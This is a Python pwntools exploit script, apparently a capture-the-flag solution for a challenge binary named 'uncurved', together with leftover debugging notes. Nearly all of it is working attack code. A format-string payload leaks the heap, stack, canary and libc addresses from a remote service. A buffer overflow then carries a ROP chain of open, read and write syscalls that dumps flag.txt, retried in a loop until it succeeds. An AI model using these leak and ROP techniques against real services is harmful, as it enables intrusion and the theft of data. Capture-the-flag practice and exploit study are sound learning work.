from pwn import *
#import os

#elf = ELF("./uncurved")
#ld = ELF("./ld-2.31.so")
libc = ELF("./libc-2.31.so")

#context.log_level = "ERROR"
i = 0
while True:
    #try:
    #    os.remove("core")
    #except:
    #    pass
    i = i + 1
    #print("Iter:\t" + str(i))
    print str(i),
    #target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    target = remote("193.57.159.27", 27374)

    target.sendlineafter(":", "whoamiT")

    target.sendafter(":", "A"*0x80)

    #gdb.attach(target, 'finish' + '\nni'*6 + '\nx/40gx $rsp')
    #555556a9b2a0.80.7fa0cbb70e8e.a.0.800000000.555556a9b2a0.4141414141414141
    fmt = "%p" + "%c"*(6+16) + "%p"*2 + "%" + str(0x0d68 - 0x47 - 13) + "p" + "%p" + "0x" + "%hn" + "%" + str(0x103 - 0x68) + "c" + "%56$hhn"

    target.sendlineafter(":", fmt)

    try:
        target.recvuntil("0x")
        heap_leak = int(target.recv(12), 0x10)
        target.recvuntil("0x")
        stack_leak = int(target.recvuntil("0x", drop=True), 0x10)
        canary = int(target.recvuntil("0x", drop=True), 0x10)
        target.recvuntil("0x", drop=True)
        libc_base = int(target.recvuntil("0x", drop=True), 0x10) - libc.sym['__libc_start_main'] - 234
        log.info("Stack Leak: " + hex(stack_leak))
        log.info("HEAP Leak: " + hex(heap_leak))
        log.info("canary: " + hex(canary))
        log.info("LIBC Base: " + hex(libc_base))

        print target.recvuntil("Rythm ")
        print("Entering sacred zone, close to getting flag :)")

        pop_rdi = p64(libc_base + 0x0000000000026796)
        pop_rsi = p64(libc_base + 0x000000000002890f)
        pop_rdx = p64(libc_base + 0x00000000000cb1cd)
        pop_rax = p64(libc_base + 0x000000000003ee88)
        pop_rbx = p64(libc_base + 0x0000000000030fff)
        sys_ret = p64(libc_base + 0x00000000000580da)
        #0x000000000002772f : push rax ; call rbx
        pushrax = p64(libc_base + 0x000000000002772f)
        buf = 0x4042d0

        def sys_gen(rax, rdi, rsi, rdx):
            return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx + p64(rdx) + sys_ret

        payload = "A"*0x88 + p64(canary) + p64(0)
        payload += sys_gen(0, 0, buf, 0x80)   #read flag.txt
        payload += sys_gen(2, buf, 0, 0)        #open
        #payload += "a"*8                       #crappy breakpoint
        #payload += p64(libc_base + libc.sym['open'])
        payload += sys_gen(0, 3, buf, 0x100)   #read from flag.txt
        payload += sys_gen(1, 1, buf, 0x100)   #write flag
        payload += sys_gen(1, 0, buf, 0x100)   #write flag
        payload += sys_gen(60, 1337, 0, 0)      #exit
        print target.sendlineafter(":", payload)

        target.sendlineafter(":", "INPUT2")
        target.sendlineafter(":", "INPUT3")

        target.sendline("flag.txt")
        break
    except:
        target.close()
        continue

target.interactive()
'''
0x7ffa0c107390 - 0x00007ffa0bf30000
0x7ffa0c107370
0x7ffa0bf6e5d0
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0c107390)
'0x1d7390'
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0c107370)
'0x1d7370'
>>> hex(- 0x00007ffa0bf30000 + 0x7ffa0bf6e5d0)
'0x3e5d0'

main --> 0x401357
0x404020
    |
0x404130:   0x0000000000008000  0x0000000000000000
0x404140:   0x0000000000000000  0x0000000000000000
0x404150:   0x0000000000000000  0x0000000000000000
0x404160:   0x0000000000000000  0x0000000000000000
0x404170:   0x0000000000000000  0x0000000000000000
0x404180:   main                0x0000000000000000
0x404190:   0x0000000000000000  0x0000000000000000
0x4041a0:   0x0000000000000000  0x0000000000000000
0x4041b0:   0x0000000000000000  0x0000000000000000
0x4041c0:   0x0000000000000000  0x0000000000000000
0x4041d0:   0x0000000000000000  0x0000000000000000
0x4041e0:   0x0000000000000000  0x0000000000000000
0x4041f0:   0x0000000000000000  0x0000000000000000
0x404200:   0x0000000000000000  0x0000000000404148
0x404210:   0x0000000000000000  0x0000000000000000
0x404220:   0x0000000000000000  0x0000000000000000
0x404230:   0x0000000000000000  0x0000000000000000
0x404240:   0x0000000000000000  0x0000000000000000
0x404250:   0x0000000000000000  0x0000000000000000
0x404260:   0x0000000000000000  0x0000000000000000
0x404270:   0x0000000000000000  0x0000000000000000

'''